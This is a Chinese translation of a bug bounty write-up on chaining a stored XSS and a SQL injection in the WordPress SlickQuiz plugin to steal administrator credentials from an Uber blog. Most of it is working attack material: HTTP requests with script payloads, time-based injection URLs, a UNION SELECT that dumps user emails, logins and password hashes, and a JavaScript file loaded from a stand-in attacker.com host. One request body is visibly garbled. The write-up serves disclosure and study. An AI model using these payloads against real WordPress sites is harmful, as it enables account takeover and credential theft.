**![SlickQuiz.png](https://image.3001.net/images/20190922/1569152494_5d875dee752a2.png!small)**

**本文讲述作者在参加HackerOne的H1-4420比赛中，针对厂商Uber的某WordPress博客网站为目标，发现其内置问卷调查插件[SlickQuiz](https://wordpress.org/plugins/slickquiz/)最新版存在存储型XSS（CVE-2019-12517）和SQL注入（CVE-2019-12516）两个漏洞，通过对这两个漏洞的综合利用，最终获取了目标WordPress网站的管理员凭据，实现了从普通访问者到管理员的提权，作者也因此获得了“最具价值黑客”（MVH）的奖励。以下是作者在自架WordPress上对漏洞的测试分享。**

## SlickQuiz问卷结果保存处存在Stored XSS（CVE-2019-12517）

在对插件SlickQuiz的源码审计中，我发现其在保存问卷结果时存在的多个明显存储型XSS，重要的是：无论“Save user
scores”（保存用户结果）的选项是否开启（默认禁用），只要有问卷测验提问出现就足以触发这种存储型XSS，因为“Save user
scores”仅只是前端显示的一个开启选项。

问题出在 **php/slickquiz-scores.php中的generate_score_row()**
方法函数上（38-52行），前端用户问卷测验答案等相关返回给SlickQuiz的信息，未经适当的编码和过滤验证。以下为
generate_score_row()函数代码：

    
    
    function generate_score_row( $score )
    
            {
    
                $scoreRow = '';
    
                $scoreRow .= '<tr>';
    
                $scoreRow .= '<td class="table_id">' . $score->id . '</td>';
    
                $scoreRow .= '<td class="table_name">' . $score->name . '</td>';
    
                $scoreRow .= '<td class="table_email">' . $score->email . '</td>';
    
                $scoreRow .= '<td class="table_score">' . $score->score . '</td>';
    
                $scoreRow .= '<td class="table_created">' . $score->createdDate . '</td>';
    
                $scoreRow .= '<td class="table_actions">' . $this->get_score_actions( $score->id ) . '</td>';
    
                $scoreRow .= '</tr>';
    
                return $scoreRow;
    
            }

 **由于用户名$score->name、邮件$score->email和分数$score->score都是前端用户可控的**，所以前端用户构造以下这种请求，就可让后台管理员触发XSS实现：

    
    
    POST /wordpress/wp-admin/admin-ajax.php?_wpnonce=593d9fff35 HTTP/1.1
    
    Host: localhost
    
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
    
    Accept: */*
    
    Accept-Language: en-GB,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    
    X-Requested-With: XMLHttpRequest
    
    Content-Length: 165
    
    DNT: 1
    
    Connection: close
    
    action=save_quiz_score&json={"name":"xss<script>alert(1)</script>","email":"test@localhost<script>alert(2)</script>","score":"<script>alert(3)</script>","quiz_id":1}

任何具备SlickQuiz管理权限的管理员，只要在后台查看了用户结果分数之后，就会触发构造请求中的Payload：

![01.png](https://image.3001.net/images/20190922/1569152115_5d875c73b0228.png!small)这个漏洞已经能非常说明问题了，但我觉得可能还有更多漏洞存在。

## SlickQuiz包含id参数的请求存在SQL注入漏洞（CVE-2019-12516）

经我研究发现，SlickQuiz插件只要有id参数出现的请求中，几乎都会存在SQL注入漏洞，如构造以下5秒延迟，包含id参数的三个请求：

> /wp-admin/admin.php?page=slickquiz-> scores&id=(select*from(select(sleep(5)))a)
>
> /wp-admin/admin.php?page=slickquiz-edit&id=(select*from(select(sleep(5)))a)
>
> /wp-admin/admin.php?page=slickquiz-> preview&id=(select*from(select(sleep(5)))a)

经测试显示，它们都会出现5秒延迟：

![02.png](https://image.3001.net/images/20190922/1569152184_5d875cb83efe7.png!small)

如第一个构造请求：/wp-admin/admin.php?page=slickquiz-scores&id=(select*from(select(sleep(5)))a)，

问题出在php/slickquiz-scores.php中第20行的构造方法中，其GET后的id参数直接传给了函数get_quiz_by_id()：

$quiz = $this->get_quiz_by_id( $_GET['id']
)；而函数get_quiz_by_id()在php/slickquiz-model.php中的定义如下，明显存在问题：

    
    
    function get_quiz_by_id( $id )
    
            {
    
                global $wpdb;
    
                $db_name = $wpdb->prefix . 'plugin_slickquiz';
    
                $quizResult = $wpdb->get_row( "SELECT * FROM $db_name WHERE id = $id" );
    
                return $quizResult;
    
            }

## 组合利用XSS和SQL注入漏洞获得管理员凭据

首先：我们用SQL注入漏洞来试试能否获得管理员账户相关信息，如：管理员注册邮箱、登录名称、哈希密码等，为此，我构造了以下Payload：

`1337 UNION ALL SELECT NULL,CONCAT(IFNULL(CAST(user_email AS
CHAR),0x20),0x3B,IFNULL(CAST(user_login AS
CHAR),0x20),0x3B,IFNULL(CAST(user_pass AS
CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM
wordpress.wp_users--`

在Burp中的请求响应如下，最终，在响应中的<h2>标签内返回了我们所需的管理员账户信息：

![03.png](https://image.3001.net/images/20190922/1569152274_5d875d12e9a9a.png!small)

根据上述SQL注入Payload，我们把它包含在JavaScript脚本中，利用XMLHttpRequest改装一下，形成以下部署在攻击者服务器上名为slickquiz.js的文件：

    
    
    let url = 'http://localhost/wordpress/wp-admin/admin.php?page=slickquiz-scores&id=';
    
    let payload = '1337 UNION ALL SELECT NULL,CONCAT(IFNULL(CAST(user_email AS CHAR),0x20),0x3B,IFNULL(CAST(user_login AS CHAR),0x20),0x3B,IFNULL(CAST(user_pass AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wordpress.wp_users--'
    
    let xhr = new XMLHttpRequest();
    
    xhr.withCredentials = true;
    
    xhr.onreadystatechange = function() {
    
      if (xhr.readyState === XMLHttpRequest.DONE) {
    
        let result = xhr.responseText.match(/(?:<h2>SlickQuiz Scores for ")(.*)(?:"<\/h2>)/);
    
        alert(result[1]);
    
      }
    
    }
    
    xhr.open('GET', url + payload, true);
    
    xhr.send();

然后，针对之前触发XSS的URL，发出以下请求：

    
    
    POST /wordpress/wp-admin/admin-ajax.php?_wpnonce=593d9fff35 HTTP/1.1
    
    Host: localhost
    
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
    
    Accept: */*
    
    Accept-Language: en-GB,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    
    X-Requested-With: XMLHttpRequest
    
    Content-Length: 165
    
    DNT: 1
    
    Connection: close
    
    action=save_quiz_score&json={"name":"xss","email":"test@localhost<script src='http://www.attacker.com/slickquiz.js'>","score":"1 / 1","quiz_id":1}on=save_quiz_score&json={"name":"xss<script>alert(1)</script>","email":"test@localhost<script src='http://www.attacker.com/slickquiz.js'>","score":"1 / 1","quiz_id":1}

同样，这种XSS+SQL注入的利用方式最终也可获取到WordPress管理员账户凭据信息，从而劫持管理员，实现从普通访问者到管理员账户的提权。

![04.png](https://image.3001.net/images/20190922/1569152332_5d875d4c16dc5.png!small)另外，基于此，也可以通过其它XMLHttpRequest构造，跨域发送上述Payload数据的方式去获取管理员凭据信息。最后非常感谢Uber奖励的好大一笔赏金。

 ***参考来源：[rcesecurity](https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/)，clouds编译整理，转载请注明来自FreeBuf.COM **  

